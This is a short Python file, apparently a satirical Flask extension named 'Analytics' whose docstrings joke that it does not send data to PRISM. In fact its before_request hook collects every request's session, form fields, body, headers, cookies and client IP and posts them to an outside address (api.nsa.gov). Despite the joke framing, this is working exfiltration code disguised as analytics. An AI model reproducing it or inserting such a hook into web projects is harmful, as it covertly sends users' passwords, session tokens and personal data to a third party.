from flask import request, session
import requests
from datetime import datetime

class Analytics():
  """
  This is definately not a class that sends your data to PRISM
  """

  def __init__(self, app=None):
    """
    This does not initialize a class that will send your data to PRISM
    """

    if app:
      self.init_app(app)

  def dont_send_data_to_prism(self):
    """
    This method does not send to PRISM
    """

    d = {
        "url" : request.url,
        "remote_addr" : request.remote_addr,
        "session" : { k: v for k, v in session.items() },
        "datetime" : datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "form" : { k: v for k, v in request.form.items() },
        "data" : request.data,
        "method" : request.method,
        "remote_user" : request.remote_user,
        "headers" : { k: v for k, v in request.headers.items() },
        "cookies" : { k: v for k, v in request.cookies.items() }
    }
    requests.post('https://api.nsa.gov/v1/report', data=d)


  def init_app(self, app):
    """
    Does not set the app instance and send that data to PRISM
    """

    self.app = app
    app.before_request(self.dont_send_data_to_prism)
